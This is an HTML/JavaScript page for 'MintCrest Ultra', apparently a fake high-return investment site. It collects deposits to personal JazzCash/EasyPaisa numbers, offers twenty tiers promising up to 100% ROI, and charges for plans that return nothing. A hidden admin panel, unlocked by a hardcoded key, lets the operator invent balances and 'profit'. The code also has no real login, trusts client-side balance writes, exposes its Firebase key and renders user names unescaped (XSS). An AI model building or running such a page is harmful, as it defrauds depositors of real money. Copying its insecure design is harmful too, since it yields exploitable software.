<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Ultra | Non-Stop Profits</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .scroller::-webkit-scrollbar { display: none; }
        .page { display: none; animation: fadeIn 0.3s ease-in-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .btn-blue { @apply bg-blue-600 hover:bg-blue-700 py-4 rounded-2xl font-bold transition active:scale-95 shadow-lg shadow-blue-900/20; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="h-full flex items-center justify-center p-6 bg-[#010409] z-[1000] absolute inset-0">
        <div class="glass w-full max-w-sm p-10 rounded-[3rem] text-center border-t-8 border-blue-600 shadow-2xl">
            <h1 class="text-3xl font-black italic tracking-tighter mb-2">MINTCREST</h1>
            <p class="text-gray-500 text-[10px] uppercase tracking-widest mb-10">Institutional Access</p>
            <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 outline-none text-center mb-4 font-bold">
            <button onclick="login()" class="w-full bg-blue-600 py-4 rounded-2xl font-bold shadow-xl">SECURE LOGIN</button>
        </div>
    </section>

    <div id="app-ui" class="hidden flex-1 overflow-y-auto scroller pb-24">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-8 rounded-[2.5rem] mb-6 border-l-4 border-blue-500">
                <p class="text-[10px] text-gray-500 font-bold uppercase mb-1">Total Assets</p>
                <h2 class="text-5xl font-black tracking-tighter text-blue-500" id="v-bal">₨ 0</h2>
                <div class="mt-4 flex gap-2"><span class="text-[10px] bg-green-500/20 text-green-400 px-2 py-1 rounded font-bold">PROFIT: <span id="v-profit">₨ 0</span></span></div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-6 rounded-3xl text-center border-b-2 border-blue-500">📥<br><span class="text-[10px] font-bold">DEPOSIT</span></button>
                <button onclick="changePage('withdraw')" class="glass p-6 rounded-3xl text-center border-b-2 border-red-500">📤<br><span class="text-[10px] font-bold">WITHDRAW</span></button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <h2 class="text-2xl font-black mb-8 italic text-center text-red-500 uppercase">Withdraw Funds</h2>
            <div class="glass p-8 rounded-[3rem] border-t-8 border-red-600">
                <input type="number" id="wd-amt" placeholder="Amount (Min 500)" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-3 outline-none">
                <input type="text" id="wd-method" placeholder="Method (JazzCash/EasyPaisa)" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-3 outline-none">
                <input type="text" id="wd-acc" placeholder="Account Number" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-6 outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-5 rounded-2xl font-black text-xs uppercase shadow-lg shadow-red-900/20">Submit Withdrawal</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-list" class="space-y-3"></div></div>
        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-blue-600">
                <p class="text-center text-xs mb-6 opacity-50 italic">JazzCash: 03705519562 / EasyPaisa: 03379827882</p>
                <input type="number" id="dep-amount" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-3 outline-none">
                <input type="text" id="dep-trx" placeholder="Transaction ID" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-4 outline-none">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-5 rounded-2xl font-bold text-xs uppercase">Send Deposit Request</button>
            </div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between mb-8"><h2 class="text-xl font-black text-blue-500 uppercase">Admin Dashboard</h2><button onclick="closeAdmin()" class="text-red-500 text-xs font-bold">CLOSE</button></div>
        <div id="adm-req-list" class="space-y-3 mb-10"></div>
        <div class="glass p-6 rounded-3xl">
            <input type="text" id="adm-user" placeholder="Target User" class="w-full bg-white/5 p-4 rounded-xl mb-2 border border-white/5">
            <input type="number" id="adm-val" placeholder="Value" class="w-full bg-white/5 p-4 rounded-xl mb-4 border border-white/5">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="manualEdit('balance')" class="bg-blue-600 py-4 rounded-xl font-bold text-[10px]">ADD BALANCE</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-4 rounded-xl font-bold text-[10px]">ADD PROFIT</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-4 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab">🏠<span class="text-[8px] font-bold uppercase">Home</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1">📈<span class="text-[8px] font-bold uppercase">Invest</span></button>
        <button onclick="changePage('wallet')" id="n-wallet" class="flex flex-col items-center gap-1">💰<span class="text-[8px] font-bold uppercase">Fund</span></button>
        <button onclick="logout()" class="flex flex-col items-center gap-1 text-red-500 opacity-50">🚪<span class="text-[8px] font-bold uppercase">Exit</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null;
        const plans = Array.from({length: 20}, (_, i) => ({ n: `Tier ${i+1}`, p: (i+1)*500, r: `${(i+1)*5}%` }));

        // PERSISTENT LOGIN CHECK
        window.onload = () => {
            const savedName = localStorage.getItem('mintcrest_user');
            if(savedName) { document.getElementById('user-name').value = savedName; login(); }
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim();
            if(!name) return;
            localStorage.setItem('mintcrest_user', name); // SAVE LOGIN
            const ref = db.collection("users").doc(name);
            const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0 });
            startSync(name);
            document.getElementById('auth-ui').style.display = 'none';
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                if(doc.exists) {
                    user = doc.data();
                    document.getElementById('v-bal').innerText = "₨ " + user.balance.toLocaleString();
                    document.getElementById('v-profit').innerText = "₨ " + user.profit.toLocaleString();
                }
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                list.innerHTML += `<div onclick="buy(${p.p})" class="glass p-5 rounded-2xl flex justify-between items-center border-b border-blue-600/30 mb-2">
                    <div><h4 class="font-bold text-xs uppercase">${p.n}</h4><p class="text-[9px] text-green-400">ROI: ${p.r}</p></div>
                    <p class="font-black text-blue-500 text-sm">₨ ${p.p.toLocaleString()}</p>
                </div>`;
            });
        }

        async function submitDeposit() {
            const amt = document.getElementById('dep-amount').value;
            const trx = document.getElementById('dep-trx').value;
            if(!amt || !trx) return alert("Fill all fields!");
            await db.collection("requests").add({ type: "deposit", user: user.name, amount: parseInt(amt), tid: trx, status: "pending", time: Date.now() });
            alert("Deposit Request Sent!"); changePage('home');
        }

        async function submitWithdraw() {
            const amt = document.getElementById('wd-amt').value;
            const method = document.getElementById('wd-method').value;
            const acc = document.getElementById('wd-acc').value;
            if(amt > user.balance || amt < 500) return alert("Invalid Amount!");
            await db.collection("requests").add({ type: "withdraw", user: user.name, amount: parseInt(amt), method: method, acc: acc, status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(amt) });
            alert("Withdrawal Request Sent!"); changePage('home');
        }

        async function buy(price) {
            if(user.balance < price) { alert("Low balance!"); changePage('wallet'); }
            else { await db.collection("users").doc(user.name).update({ balance: user.balance - price }); alert("Activated!"); }
        }

        function changePage(p) {
            document.querySelectorAll('.page').forEach(page => page.classList.remove('active-page'));
            document.querySelectorAll('nav button').forEach(btn => btn.classList.remove('active-tab'));
            document.getElementById('p-' + p).classList.add('active-page');
            document.getElementById('n-' + (p==='withdraw'?'home':p)).classList.add('active-tab');
        }

        function logout() { localStorage.removeItem('mintcrest_user'); location.reload(); }

        // ADMIN CORE
        window.addEventListener('keydown', e => {
            if(e.ctrlKey && e.shiftKey && e.key === 'A') {
                if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); }
            }
        });

        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-req-list');
                list.innerHTML = snap.empty ? '<p class="text-center opacity-30 py-10 text-xs">No Requests</p>' : '';
                snap.forEach(doc => {
                    const d = doc.data();
                    const isDep = d.type === 'deposit';
                    list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center border-l-4 ${isDep?'border-green-500':'border-red-500'}">
                        <div class="text-[9px] text-left">
                            <b class="text-blue-400 uppercase">${d.user} (${d.type})</b><br>
                            <span>₨ ${d.amount} | ${isDep ? 'TID: '+d.tid : d.method+' '+d.acc}</span>
                        </div>
                        <div class="flex gap-1">
                            <button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, true, '${d.type}')" class="bg-green-600 px-3 py-1 rounded text-[8px] font-bold">YES</button>
                            <button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, false, '${d.type}')" class="bg-red-600 px-3 py-1 rounded text-[8px] font-bold">NO</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function handleReq(id, target, amt, approve, type) {
            if(approve && type === 'deposit') {
                const ref = db.collection("users").doc(target);
                const d = await ref.get();
                await ref.update({ balance: (d.data().balance || 0) + amt });
            } else if(!approve && type === 'withdraw') {
                const ref = db.collection("users").doc(target);
                const d = await ref.get();
                await ref.update({ balance: (d.data().balance || 0) + amt });
            }
            await db.collection("requests").doc(id).delete();
            alert("Action Processed!");
        }

        async function manualEdit(f) {
            const u = document.getElementById('adm-user').value;
            const v = document.getElementById('adm-val').value;
            const ref = db.collection("users").doc(u);
            const d = await ref.get();
            if(d.exists) await ref.update({ [f]: (d.data()[f] || 0) + parseInt(v) });
            alert("Success!");
        }

        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
    </script>
</body>
</html>
